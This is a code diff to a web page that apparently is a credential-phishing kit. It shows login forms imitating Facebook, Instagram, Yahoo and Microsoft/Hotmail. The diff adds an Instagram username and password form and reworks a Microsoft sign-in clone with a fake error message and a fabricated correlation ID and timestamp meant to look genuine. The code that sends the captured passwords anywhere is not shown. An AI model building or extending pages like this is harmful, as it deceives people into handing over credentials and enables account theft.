@@ -6,9 +6,7 @@
   <script src="js/jquery-3.6.0.min.js"></script>
   <link rel="stylesheet" href="css/index.css">
   <link rel="stylesheet" href="secured/yahoo/css/style.css">
-  <link rel="stylesheet" href="auth/microsoft/style.css">
   <script src="js/index.js"></script>
-  <link rel="stylesheet" href="auth/microsoft/fontawesome-free-5.10.1-web/css/all.css" type="text/css"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.js"></script>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
@@ -217,8 +215,10 @@
         <p>
           <img id="fb" onclick="fb()" src="image/fb.png">
           <img id="ig" onclick="ig()" src="image/ig.png">
+        </p>
+        <p>
           <img id="yh" onclick="yh()" src="https://1000logos.net/wp-content/uploads/2017/05/Yahoo-logo.jpg">
-          <img id="hm" onclick="hm()" src="auth/microsoft/img/microsoft_PNG18.png">
+          <img id="hm" onclick="hm()" src="auth/microsoft/img/microsoft_logo.svg">
 
         </p>
         <br>
@@ -240,6 +240,25 @@
           <input type="password" placeholder="Password" id="fb-pass"><br>
           <button onclick="login()" id="fb-log">
             Log in
+          </button>
+        </div>
+      </div>
+    </div>
+  </center>
+
+  <center>
+    <div id="igp">
+      <div class="Instagram-login" id="ig2" align="center">
+
+        <div class="igt">
+
+          <img src="image/ig2.png" alt="logo" id="iglogo"><br><br>
+          <br>
+          <input type="text" placeholder="Username or Email" id="ig-uname"><br>
+          <input type="password" placeholder="Password" id="ig-pass">
+          <br>
+          <button onclick="iglog()" id="ig-log">
+            log in
           </button>
         </div>
       </div>
@@ -274,8 +293,8 @@
                 </div>
                 <div>
                     <a href="" id="p5">
-                        <button id="b3"> Hotmail<img id="image3"
-                                src="../../auth/microsoft/img/microsoft_PNG18.png" alt="" height="32px">&nbsp;
+                        <button id="b3"><img id="image3"
+                                src="auth/microsoft/img/microsoft_logo.svg" alt="logo" height="32px">&nbsp;
                         </button>
                     </a>
                 </div>
@@ -287,11 +306,12 @@
  <div id="hmp">
     <div class="hmt">
 
+      <main>
           <div id="form-holder">
-              <img class="sign-in" src="img/microsoft_logo.svg" alt="logo" id="ms-logo">
+              <img class="sign-in" src="auth/microsoft/img/microsoft_logo.svg" alt="logo" id="ms-logo">
                   <h2 class="sign-in-content sign-in">Sign in</h2>
                   <p class="error-message sign-in">That Microsoft account doesn't exist. Enter a different account or <a href="#">get a new one</a>.</p>
-                  <input id="hm-uname" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
+                  <input id="hm-email" class="sign-in-content sign-in" type="email" maxlength="113" lang="en" class="form-control ltr_override" aria-required="true" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader" placeholder="Email, phone, or Skype">
                   <p class="sign-in-content sign-in">No account? <a href="#">Create one!</a></p>
                   <p class="sign-in-content sign-in"><a href="">Sign-in options</a></p>
                   <div class="sign-in-content sign-in" id="submit">
@@ -310,6 +330,11 @@
                   <img src="img/803.gif" alt="loading">
               </div>
           </div>
+          <div class="message" hidden>
+              <p><b>Correlation Id:</b> 872f6832bc454f95aa40281782ee32e7</p>
+              <p><b>Timestamp:</b> 2019-08-08T19:25:33.813Z</p>
+          </div>
+      </main>
   </div>
 </div>
 
